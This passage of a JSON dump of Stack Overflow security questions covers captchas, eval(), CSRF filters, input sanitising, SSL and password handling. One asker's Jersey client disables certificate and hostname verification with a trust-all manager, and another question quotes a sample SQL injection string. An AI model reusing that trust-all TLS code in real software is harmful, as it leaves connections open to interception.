safe ? ( any way to bypass it ?)</p>\n\n<p><em>To avoid pasting 800 lines of code I've made a summary, I hope it is clear.</em></p>\n\n<p><strong>captcha script :</strong></p>\n\n<pre><code>$n1  = mt_rand(0,10);  \n$n2  = mt_rand(0,10);  \n$fig = array('zero','one','two','three','four','five','six','seven','eight','nine','ten');  \n$result = $n1 + $n2;\n$sentence = $fig[$n1] .' plus '.$fig[$n2];  \n$_SESSION['captcha'] = $result;  \n$captcha_label = \"&lt;label for='captcha' &gt;How much does \".$sentence.\"make?&lt;/label&gt;\";               \necho $captcha_label.\"&lt;/label&gt;&lt;input  type='text' name='captcha'  value=''/&gt;&lt;br /&gt;\";                                 \necho \"&lt;input type='submit' name='create' value='create account'&gt;\"; \n</code></pre>\n\n<p><strong>PAGES:</strong></p>\n\n<ul>\n<li><strong>form.php:</strong></li>\n</ul>\n\n<p>all <em>'create account'</em> input fields + captcha</p>\n\n<p>=> test</p>\n\n<ul>\n<li><p><strong>test.php:</strong></p>\n\n<p><code>if($_POST['captcha'] != $_SESSION['captcha']){<br>\n    $_SESSION['captcha_control'] = \"false\";</code>\n    }  </p></li>\n</ul>\n\n<p>Then all <em>'create account'</em> $_POSTS are injection tested</p>\n\n<p>If any of them or the captcha returns \"false\" , the script deflects to => problem.php</p>\n\n<ul>\n<li><strong>problem.php:</strong></li>\n</ul>\n\n<p>Echoes the initial form with all \"wrong fields\" highlighted \nand a new captcha is displayed, was it right or was it wrong.<br>\nvalidation => back to <strong>test.php</strong></p>\n\n<p>Thanks a lot.</p>\n"},{"tags":["security","tcp-ip"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":49,"score":-2,"question_id":12222521,"title":"TCP IP shortcomings","body":"<p>Before I ask any Q'(s), I understand that:\n1. Transmission Control Protocol (TCP) runs on top of IP,</p>\n\n<ol>\n<li><p>TCP provides guaranteed delivery, and ensures that the packets are delivered in sequence.</p></li>\n<li><p>The underlying network IP, is highly unreliable and does not provide any guarantee for TCP.</p></li>\n<li><p>I'm not an networking pro.</p></li>\n</ol>\n\n<p>I've been reading an interesting detailed Security article by CHRIS CHAMBERS, JUSTIN DOLSKE, and JAYARAMAN IYER on <a href=\"http://www.linuxsecurity.com/resource_files/documentation/tcpip-security.html\" rel=\"nofollow\">TCP IP Security, the basis of today's internet </a>; which unfortunately lack even the most basic mechanisms for security.</p>\n\n<p>I understand that the TCP and IP protocols were designed when the 'Internets' was small, and users generally trusted each other.  In most occasions, the two protocols that are referred to are:\nthe RFC's for IP [RFC 791], and TCP [RFC 793].</p>\n\n<p>As discussed, \"Since the network is dynamic, it is possible that two datagrams from the same source take different paths to make it to the destination\", and  \"IP only tries for a best-effort delivery. It does not take care of lost packets; this is left to the higher layer protocols. There is no state maintained between two datagrams; in other words, IP is connection-less.......\".</p>\n\n<p>Among other many problems,nnone of the IP fields are encrypted and there's no authentication (Note that this is partially fixed in in IP6).</p>\n\n<p>Are there any 'real' fixes for TCP/IP 4 weaknesses?</p>\n"},{"tags":["javascript","security","eval"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":13167403,"title":"Is Javascript eval() so dangerous?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil\">When is JavaScript’s eval() not evil?</a>  </p>\n</blockquote>\n\n\n\n<p>I am writing a script in which users have to write in a currency amount, some examples could be (user input >> converts to), with USD as default currency:</p>\n\n<pre><code>50       &gt;&gt; 50.0 USD\n50.5     &gt;&gt; 50.5 USD\n50+1 USD &gt;&gt; 51.0 USD\n50 GBP   &gt;&gt; 50.0 GBP\n</code></pre>\n\n<p>I want to make this as smooth as possible, therefore I want to use JavaScript (it's a web app based on PHP/MySql + JavaScript). I want to use regex to filter the input, run it through <code>eval()</code> and return it.</p>\n\n<p>Is this a bad idea? I've read some topics about <code>eval()</code> being a security issue. I just don't see how. A user can easily run JavaScript anyway?</p>\n\n<p>Keep in mind that I will validate all input server-side with PHP at a later stage.</p>\n"},{"tags":["security","api","application"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":19,"score":0,"question_id":13163132,"title":"How to secure account creation via (private) API?","body":"<p>Some time ago, it was commonplace for smartphone apps to open a browser to a registration page with a CAPTCHA, or to require separate signup via web, because API signup was seen as vulnerable.</p>\n\n<p>Now most apps seem to offer registration via native form, though endpoints for this are usually not documented in their public API. I haven't seen many reports of this being abused to create spam accounts.</p>\n\n<p>How is this done? Is there a standard crypto/handshake process to verify real signups, or does signup typically rely on undocumented endpoints and simple API key passing?</p>\n"},{"tags":["asp.net","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13166703,"title":"Native code-level authorization mechanism?","body":"<p>I'm looking for a native ASP.NET mechanism to keep my apps secure. Right now the business functionality is contained in a business layer and that's where I handle security stuff... Basically whenever I encounter a situation where someone is trying to do something that they can't do, I throw an exception. This exception is not handled on the calling side and a yellow error screen is displayed.</p>\n\n<p>The apps are secure but the yellow screen is a bit lacking in user friendliness.</p>\n\n<p>I already use CAS SSO, Profile Provider and Role Provider together. What I'm looking for is a system for the most granular bit of security, at the code level. Is there a kind of mechanism in ASP.NET to handle this?</p>\n\n<p>For now this is what I have in mind: Find a general place somewhere to handle all security-type exceptions thrown by my business layer and forward the request to an Unauthorized.aspx page to notify the user that something unauthorized was attempted. I'm not too sure where to stick the catch-all though.</p>\n"},{"tags":["ruby-on-rails","facebook","security","facebook-graph-api","facebook-javascript-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13166310,"title":"Building an API backend with Rails 3 and Facebook login","body":"<p>I've a simple application, that requires facebook signup/login built in Rails 3 that works exactly as I want it to.\nMeanwhile, I had several requests to make it behave like an API, the web app is a social media tool where people publish content to their own social networks. i'm converting the system to provide a solution for the following problem:</p>\n\n<ul>\n<li>3rd party website having their own login system</li>\n<li>They want to make a button - publish through X service - and as soon as the user presses the button he will be shown the Facebook Permissions' dialog for my own fb app, as soon as he authorizes it the content will be published</li>\n</ul>\n\n<p>So far, while the webapp was a standalone website, this was really easy to do - they would go to my webapp, login with facebook and published whatever they wanted to, however, I'm finding it hard to come up with a solution that doesn't present any security issues. Here's what I was thinking:</p>\n\n<ul>\n<li>I provide a JS SDK which:\n<ul>\n<li>the 3rd party install in their website -> a special method is associated with a button</li>\n<li>Once the button is pressed, the user is redirected to FB (sets de redirect_ui to be the current page)</li>\n<li>catches the params whenever FB redirects back (as soon as the user gives the permissions)</li>\n<li>Push the content through Facebook and so on</li>\n<li>the 3rd party provides a callback that will run as soon as the content is published (I send them the FB_ID and access token)</li>\n<li>The 3rd party can now make calls to all my API given they will send the FB_ID and access token which I sent as soon as I had the permissions</li>\n</ul></li>\n</ul>\n\n<p>Will this work ? Can I easily catch back the FB redirect ? Are there any security issues ?</p>\n\n<p>Thanks in advance,\nZe</p>\n"},{"tags":["security","maven","ssl","tomcat7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12448677,"title":"force ssl in tomcat 7","body":"<p>I want to force all users to use SSL for all pages in my application. I am using mavan 3 and used this plugin in maven:</p>\n\n<pre><code>        &lt;plugin&gt;\n            &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt;\n            &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt;\n            &lt;version&gt;2.0-SNAPSHOT&lt;/version&gt;\n            &lt;configuration&gt;\n                &lt;server&gt;TomcatServer&lt;/server&gt;\n                &lt;httpsPort&gt;8443&lt;/httpsPort&gt;\n                &lt;keystoreFile&gt;-- My keystore path --&lt;/keystoreFile&gt;\n                &lt;keystorePass&gt;-- My keystore pass --&lt;/keystorePass&gt;\n                &lt;path&gt;/&lt;/path&gt;\n            &lt;/configuration&gt;\n        &lt;/plugin&gt;\n</code></pre>\n\n<p>On running the server through maven (mvn tomcat7:run), my server logs are like this:</p>\n\n<pre><code>...\nINFO: Initializing Spring root WebApplicationContext\nSep 16, 2012 9:55:17 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [\"http-bio-8080\"]\nSep 16, 2012 9:55:17 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [\"http-bio-8443\"]\n</code></pre>\n\n<p>However, when I access the page with https, I get SSL connection error in chrome and \"SSL received a record that exceeded the maximum permissible length.\" in firefox.</p>\n\n<p>1) I believe maven embeds Tomcat 7 in the war. So, there is no server.xml file where I can manually configure SSL. How can I configure SSL in my pom.xml?</p>\n\n<p>2) How to make sure that all requests get forwarded to 8443?</p>\n"},{"tags":["c#","windows","security","winapi","windows-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12950089,"title":"Why does LogonUser always return error code 1008?","body":"<p>I'm using LogonUserA function to authenticate user in a ASP.NET 4.0 web application that running on IIS7/Win2008. It works well if user enters correct user name and password, but in case user name or password is wrong, LogonUserA always return a same error code 1008 that translate to a vague message \"An attempt was made to reference a token that does not exist\". Of course if LogonUserA failed then there'll be no valid token, so what does this error mean? Is there any specific error code for typical login errors? and how can I get it?</p>\n\n<p>Below is my code:</p>\n\n<pre><code>[DllImport(\"advapi32.dll\", SetLastError = true)]\npublic static extern int LogonUserA(string lpszUserName,\n    string lpszDomain,\n    string lpszPassword,\n    int dwLogonType,\n    int dwLogonProvider,\n    ref IntPtr phToken);\n\nif (0 != LogonUserA(userName, domain, newPassword, Logon32LogonInteractive, Logon32ProviderDefault, ref token))\n{\n    // error is always 1008 if user name of password is incorrect.\n    int error = Marshal.GetLastWin32Error();\n\n    var exception = new Win32Exception(error);\n\n    // What I got in error log for above Win32Exception is:\n    // System.ComponentModel.Win32Exception (0x80004005): An attempt was made to reference a token that does not exist\n}\n</code></pre>\n"},{"tags":["security","authentication","google-authentication"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13164314,"title":"If I use Google authentication for a site, can I tell if the user has 2 step auth?","body":"<p>I want to use Google authentication for a site, but want to enforce use of Google 2 step authentication.  Is there a way for me to tell if a user has this on or not?  I want to boot users who don't use it.</p>\n\n<p>Note that this is for a non-Google site, so I can't use the enforcement capability that Google Apps allows for.</p>\n"},{"tags":["android","security","android-camera","android-camera-intent"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13164261,"title":"Capture full resolution image from camera in a secure way (without storing to disk, if possible)","body":"<p>I am developing an app that will allow users to capture images of secure documents and upload those images to a server (a good example of what I'm trying to do is a banking app that allows users to take pictures of checks.)</p>\n\n<p>For security reasons, I do not want the image physically stored on disk at any point, if possible.</p>\n\n<p>When I try to do this with the MediaStore.ACTION_IMAGE_CAPTURE intent, it works... but the resolution is very low.  I assume this is to prevent overuse of RAM.  I've looked around for solutions, but all of the ones I found involve storing the image on the SD card or internal NAND storage.  I do not want to do that.</p>\n\n<p>If it is not possible to avoid storing the photo, is there a way for the image to be stored to a location only accessible to my app?  I would then delete the file after it's uploaded.  And if I have to do it this way, is there any way to encrypt the photo as it's being stored?</p>\n\n<p>Here's a simplification of my current code, in case that helps at all:</p>\n\n<pre><code>    Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n    startActivityForResult(intent,requestCode);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>protected void onActivityResult(int requestCode, int resultcode, Intent data)\n{\n    if (resultcode == RESULT_OK)\n    {\n        Bitmap bmp = getBitmapFromIntent(data);\n    }\n}\nprivate Bitmap getBitmapFromIntent(Intent intent)\n{\n    Bundle extras = intent.getExtras();\n    return (Bitmap) extras.get(\"data\");\n}\n</code></pre>\n"},{"tags":["security","passwords","trimming"],"answer_count":7,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":340,"score":6,"question_id":7240869,"title":"Should I trim spaces in a password field","body":"<p>Just wondering.</p>\n\n<p>We usually trim a user name in various forms in our ASP.Net application, whats the best practices for password fields.</p>\n\n<p>i.e. should we remove a trailing space in a password  field before being saved/encrypted?</p>\n"},{"tags":["javascript","ajax","security","same-origin-policy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13161092,"title":"Same origin policy causes Ajax requests to example.com from www.example.com to be denied?","body":"<p>If you visit a website at <a href=\"http://www.example.com/dir\" rel=\"nofollow\">http://www.example.com/dir</a> , then any ajax requests to <a href=\"http://example.com/dir/something.php\" rel=\"nofollow\">http://example.com/dir/something.php</a> (with the www missing) cause the following message to show up in google chrome's console:</p>\n\n<pre><code>XMLHttpRequest cannot load http://example.com/dir/something.php.\nOrigin http://www.example.com is not allowed by Access-Control-Allow-Origin.\n</code></pre>\n\n<p>What's up with this, and what can be done to fix this?</p>\n\n<p>Edit: It seems that any cookies set by example.com also disappear when you visit www.example.com ?</p>\n"},{"tags":["php","mysql","security","xss-prevention","code-injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13160789,"title":"Securely handling user input in PHP and mySQL","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/129677/whats-the-best-method-for-sanitizing-user-input-with-php\">What’s the best method for sanitizing user input with PHP?</a>  </p>\n</blockquote>\n\n\n\n<p>I know similar questions have been asked multiple times here, and I've spent some time reading all of them, but I am still not confident if my application is going to be secure...</p>\n\n<p>The website I am building allows users to post things into a database, edit their own postings, search for other postings, and display postings from other users. Clearly, there is a whole bunch of user input and form data and what not, which I have to make sure is secure.</p>\n\n<p>So here's how my process currently works:</p>\n\n<ol>\n<li>users input their data into HTML forms, which are converted into $_POST data.</li>\n<li>a posthandler.php file converts all $_POST data into $_SESSION data</li>\n<li>the $_SESSION data is converted into $this-> class variables</li>\n<li>the $this-> class variables are used in the mySQL query and entered into the DB</li>\n<li>from the DB the data is displayed back in HTML.</li>\n</ol>\n\n<p>What measures do I have to take in which of those steps in order to insure the security of my website? (preventing code injection and XSS)</p>\n\n<p>For now this is what I am thinking, please correct me if I am wrong:</p>\n\n<ul>\n<li><p>For 1. I have no control, the data is completely vulnerable.</p></li>\n<li><p>Therefore in 2. I have to check if the data matches certain patterns, which I expect (check if it's numeric, check if it's a date, check if it's letters only, check if it's a value from an array which I provide, use regular expressions, ... ) This way I can prevent for example if I expect a value between 1 and 10, and someone says \"'--DROP table;\" instead that I have already made sure these fields are secure. Of course fields, which are not as restrictive like text boxes where users can type messages are still vulnerable.</p></li>\n<li><p>For step 3. there shouldn't be anything I need to do, if I did everything correct in the step before, right? An attacker shouldn't be able to change the SESSION data or the class variables, unless there is a major security breach on the server side, for which my hosting provider should be responsible, correct? </p></li>\n<li><p>In step 4. where I do my query, I need to escape the data with mysqli_real_escape_string() to make sure the data is not handled as a command.</p></li>\n<li><p>And in step 5. I plan on converting every special character into their respective HTML code snippet. All <code>\"</code> are going to be converted to <code>&amp;quot;</code> for example.</p></li>\n</ul>\n\n<p>Are there any additional security measures /filters I should apply within each step?</p>\n\n<p>What if I make a mistake in step 2.) or I am unable to find a regular expression for a field. I just convert from $_POST to $_SESSION without further validation. Will it save my butt to use mysqli_real_escape_string() during the query and to filter all characters before they are displayed in the browser?</p>\n\n<p>I look forward to your insight! </p>\n"},{"tags":["asp.net-mvc","security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13160311,"title":"MVC4 storing and recalling user password","body":"<p>Current I'm working on an a project using MVC4 in which we have a service reference looking into the Database to return our content.  The service reference requires me to provide the username/password each time I make a call. </p>\n\n<p>What would be best practices for this?  Should I encrypt the password then save it to a cookie or should I issue the user an Auth Token?  Or would there be a third option?</p>\n"},{"tags":["java","security","zip","hidden-files","windows-kernel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":31,"score":-3,"question_id":13158462,"title":"Protection program for files and folders","body":"<p>The project is a security program that locks files and folders using Java<br>\nI have two ideas:</p>\n\n<p>First: Hiding the file or folder in Windows Kernel level<br>\nI cannot find a way to do this at this moment.<br>\nHow can I do this? Are there any helpful tips?  </p>\n\n<p>Another solution: Create a new extension Windows cannot read and close it with a password.<br>\nTransformed the desired file to zip file and then read it as bytes and stored in a file with the new extension I have created.\nHere are two problems: Reading the bytes takes a long time and if the file size is large (larger than 200 MB) it produces an error as the runtime memory is full.  </p>\n\n<p>How do you solve these problems?<br>\nAre there ways to protect files and folders except those two methods??  </p>\n\n<p>*If anything is not clear ask me please.  </p>\n\n<p>thanks for help </p>\n"},{"tags":["security","windows-7","registry"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13158488,"title":"Windows 7 Registry Security","body":"<p>This qyestion has been bugging me for months, but I've found other things to focus on so it has lingered.</p>\n\n<p>I have two Windows 7 machines, seemingly identically configured and yet something is different and I don't know enough about such matters to figure out what the difference is.</p>\n\n<p>We would like to execute the following command line as an administrative user:</p>\n\n<pre><code>regedit /s myspecial.reg\n</code></pre>\n\n<p>and update the registry with these keys.</p>\n\n<p>We find the following:</p>\n\n<p>One one machine, the registry is updated as expected.  On the other machine, although no error message is shown, the registry is not updated.  On both machnines, if entering regedit in interactive mode, we are able to import myspecial.reg.</p>\n\n<p>What security setting is responsible for this difference?</p>\n"},{"tags":["security","client","jersey","realm"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":8925,"score":2,"question_id":3434309,"title":"Accessing secure restful web services using jersey client","body":"<p>I have created web services based on Jersey (auto generated via Netbeans).</p>\n\n<p>I have also created a user names “testClient” with password “secret” and created User group “Users” and used file Realm using glassfish 3.0.1 admin console.</p>\n\n<p>I have also mapped web.xml and sun-web.xml accordingly.</p>\n\n<p>My web services are secured successfully; as I access the web site I receive a security warning and then I am prompt to give username and password to access any content of the website. It is working fine when accessed via web browser.</p>\n\n<p>Now I have written a simple client based on jersey and tried to access the web services offered by the 1st project; the client code is here</p>\n\n<p>Auto generated Jersey client code\n<code>\npublic class JerseyClient {\n    private WebResource webResource;\n    private Client client;\n    private static final String BASE_URI = \"https://localhost:9028/testsecurity2/resources\";</p>\n\n<pre><code>public JerseyClient() {\n    com.sun.jersey.api.client.config.ClientConfig config = new com.sun.jersey.api.client.config.DefaultClientConfig(); // SSL configuration\n    // SSL configuration\n    config.getProperties().put(com.sun.jersey.client.urlconnection.HTTPSProperties.PROPERTY_HTTPS_PROPERTIES, new com.sun.jersey.client.urlconnection.HTTPSProperties(getHostnameVerifier(), getSSLContext()));\n    client = Client.create(config);\n    webResource = client.resource(BASE_URI).path(\"manufacturers\");\n}\n\npublic &lt;T&gt; T get_XML(Class&lt;T&gt; responseType) throws UniformInterfaceException {\n    return webResource.accept(javax.ws.rs.core.MediaType.APPLICATION_XML).get(responseType);\n}\n\npublic &lt;T&gt; T get_JSON(Class&lt;T&gt; responseType) throws UniformInterfaceException {\n    return webResource.accept(javax.ws.rs.core.MediaType.APPLICATION_JSON).get(responseType);\n}\n\npublic void close() {\n    client.destroy();\n}\n\npublic void setUsernamePassword(String username, String password) {\n    client.addFilter(new com.sun.jersey.api.client.filter.HTTPBasicAuthFilter(username, password));\n}\n\nprivate HostnameVerifier getHostnameVerifier() {\n    return new HostnameVerifier() {\n\n        @Override\n        public boolean verify(String hostname, javax.net.ssl.SSLSession sslSession) {\n            return true;\n        }\n    };\n}\n\nprivate SSLContext getSSLContext() {\n    javax.net.ssl.TrustManager x509 = new javax.net.ssl.X509TrustManager() {\n\n        @Override\n        public void checkClientTrusted(java.security.cert.X509Certificate[] arg0, String arg1) throws java.security.cert.CertificateException {\n            return;\n        }\n\n        @Override\n        public void checkServerTrusted(java.security.cert.X509Certificate[] arg0, String arg1) throws java.security.cert.CertificateException {\n            return;\n        }\n\n        @Override\n        public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    };\n    SSLContext ctx = null;\n    try {\n        ctx = SSLContext.getInstance(\"SSL\");\n        ctx.init(null, new javax.net.ssl.TrustManager[]{x509}, null);\n    } catch (java.security.GeneralSecurityException ex) {\n    }\n    return ctx;\n}\n</code></pre>\n\n<p>}\n</code>\nCode in Main Method; uses auto generated code\n<code>\nJerseyClient client = new JerseyClient();\nclient.setUsernamePassword(\"testClient\", \"secret\");\nObject response = client.get_XML(String.class);\n// do whatever with response\nclient.close();\n</code></p>\n\n<p>Results\n<code>\nException in thread \"main\" com.sun.jersey.api.client.ClientHandlerException: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:128)\n        at com.sun.jersey.api.client.filter.HTTPBasicAuthFilter.handle(HTTPBasicAuthFilter.java:78)\n        at com.sun.jersey.api.client.Client.handle(Client.java:457)\n        at com.sun.jersey.api.client.WebResource.handle(WebResource.java:557)\n        at com.sun.jersey.api.client.WebResource.access$300(WebResource.java:69)\n        at com.sun.jersey.api.client.WebResource$Builder.get(WebResource.java:451)\n        at clients.JerseyClient.get_XML(JerseyClient.java:23)\n        at clients.NewMain1.main(NewMain1.java:20)\nCaused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:808)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1112)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1139)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1123)\n        at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:434)\n        at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:166)\n        at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1049)\n        at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:373)\n        at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:318)\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler._invoke(URLConnectionClientHandler.java:215)\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:126)\n        ... 7 more\nCaused by: java.io.EOFException: SSL peer shut down incorrectly\n        at com.sun.net.ssl.internal.ssl.InputRecord.read(InputRecord.java:333)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:789)\n        ... 17 more\nJava Result: 1\n</code>\nI also want to inform that these are two different projects running on different servers both are glassfish 3.0.1. I also tried to run client and services on the same server but all in vain. I am stuck; kindly help me.</p>\n\n<p>Cheers!</p>\n"},{"tags":["javascript","security","firefox","browser-cache"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13155963,"title":"Disable Mozilla Firefox to store javascripts","body":"<p>right now if you open view page source in Mozilla, \nyou'll see an external javascript link.\nif you click on that link the browser will show javascript function from browser cache.\nbut if you select view>>reload the browser will requesting to server.</p>\n\n<p>on IE and Chrome you click the hyperlink from view source, it will always requesting to server.\nis there a way to get a same behavior on Mozilla?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I am a webmaster, and I wonder this will be done using javascript or anything server side code.</p>\n"},{"tags":["php","security","symfony2","login","salt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13156274,"title":"Symfony 2 using salt login always returns Bad credentials","body":"<p>if I'am using salt to decode my password using, the login always returns \"Bad credentials\".</p>\n\n<p>I'am using Fixture to create some testdata:</p>\n\n<pre><code>public function load(ObjectManager $manager)\n{\n    $encodeFactory = $this-&gt;container-&gt;get('security.encoder_factory');\n\n    $user = new User();\n    $user-&gt;setUsername('admin');\n    $user-&gt;setEmail('webmaster@aranox.de');\n\n    $encoder = $encodeFactory-&gt;getEncoder($user);\n    $user-&gt;setPassword($encoder-&gt;encodePassword('admin', $user-&gt;getSalt()));\n\n    $user-&gt;setIsEnabled(true);\n\n    $manager-&gt;persist($user);\n    $manager-&gt;flush();\n\n    $this-&gt;addReference('user-admin', $user);\n}\n</code></pre>\n\n<p>I set up the encoding in security.yml:</p>\n\n<pre><code>security:\n    encoders:\n        Aranox\\UserBundle\\Entity\\User:\n            algorithm: sha512\n</code></pre>\n\n<p>creating salt in my user-entity using:</p>\n\n<pre><code>...\n/**\n * @ORM\\Column(type=\"string\", length=255)\n */\nprivate $password;\n/**\n * @ORM\\Column(type=\"string\", length=255)\n */\nprivate $salt;\n\n...\nfunction __construct()\n{\n    $this-&gt;groups               = new ArrayCollection();\n    $this-&gt;salt                 = md5(uniqid(null, true)); \n...\n</code></pre>\n\n<p>If creating no salt ($this->salt = \"\"), all works fine.</p>\n\n<p>How can this happens? </p>\n"},{"tags":["android","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":9456973,"title":"Passing passwords between activites","body":"<p>Is it safe to pass a password from one activity to another without encrypting it? I will then, once it's in the next activity, encrypt it and store it. Or should I encrypt it first?</p>\n"},{"tags":["iphone","objective-c","ios","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":13156599,"title":"How I using an RSA public key generated and how I encrypted in iOS","body":"<p>Hello I am a novice developer. And just gave me a project to iOS, but I have to encrypt part ciert an information.</p>\n\n<p>I have to use 1024-bit RSA. The only thing they give me is a public key:</p>\n\n<pre><code>BitStrength = 1024\n\nRSAKeyValue\n\nModulus = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nExponent = Xxxx\n\nRSAKeyValue\n</code></pre>\n\n<p><strong>Example:</strong> a string unencrypted and encrypted</p>\n\n<p><strong>Unencrypted string:</strong></p>\n\n<pre><code>Prueba de Encriptacion\n</code></pre>\n\n<p><strong>Encrypted string above:</strong></p>\n\n<pre><code>uaUbBBR6Ghx/6EaspBB1QD024uUZ7O+koeNd0PTAt/wnM5w8s8TqRSGnB9iK7oSyRce4BPuVzFzsB2P34/fq5MoyuKvPG6vDZp8Ck/GifZAOZN1dbCRgOdE8qboKcWYH3WcZieUfpBepBwR6usY2xWaH9/56PCeSaDgncSPGrWc=bcrcdoaSp0zSv6hKc0jqh2oyVtLOaMmSqLxNRVpD62ojwfkFFb8zTJVFBUpxNmDCU4b0xgP0iYu9rRVBlo0Yp2GhoCgz/cR9+PRwOXWJYoV4Qd1j7zHZDsMy7njE8hBoU6N6ZVYkEhIfQ8z1TqOQyWeNUcll3JqaHNEqsF4w0Io=\n</code></pre>\n\n<p>I have to get the encrypted string. <em>no need to decrypt</em></p>\n\n<p>This is the first time I work with RSA encryption and truth I have no idea how to do it and also do not understand that use of the Exponent sent to me, as I read this encryption works but not how to implement iOS.</p>\n"},{"tags":["security","tomcat","csrf"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13151768,"title":"Getting 403 error when using CSRF filter with tomcat 6.0.32","body":"<p>This is my filer config in web.xml</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;filter&gt;\n    &lt;filter-name&gt;CSRFPreventionFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.apache.catalina.filters.CsrfPreventionFilter&lt;/filter-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;entryPoints&lt;/param-name&gt;\n        &lt;param-value&gt;/login&lt;param-value&gt;\n    &lt;/init-param&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;CSRFPreventionFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;filter&gt;\n</code></pre>\n\n<p>Am I missing something? Are any code-changes necessary to enable csrf protection in tomcat</p>\n"},{"tags":["java","security","encryption","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13151549,"title":"SSL handshake process","body":"<p>I am getting started on security and read about the SSL handshaking scenario. In this <a href=\"http://stackoverflow.com/questions/3936071/how-does-browser-generate-symmetric-key-during-ssl-handshake\">post</a>, the replier mentioned that the symmetric key is generated on the browser, encrypted using the server's public key and sent over to the server.</p>\n\n<p>However, in the other articles, they mentioned that a pre-master secret was generated and sent over instead for calculation of the symmetric key. </p>\n\n<p>May I know which is the correct explanation, and how is this pre-master secret generated and used to generate the symmetric key?</p>\n"},{"tags":["java","security","registry"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13155012,"title":"How to store password in key registry using java?","body":"<p>How to save and retrieve password in key registry?<br>\nHow to Protects key from editing and deleting?<br>\nIf key deleted, How to know the person authorized to enter application?</p>\n"},{"tags":["security","jsp","ssl-certificate","jdeveloper","weblogic11g"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13154696,"title":"Trusted CA Certificate Issue in Jdeveloper Weblogic server","body":"<p>Everytime i run my Java project in Jdeveloper following WARNING appears due to hwcih my JSP page appears late.How do I avoid this</p>\n\n<pre><code>     &lt;Oct 31, 2012 2:44:02 PM 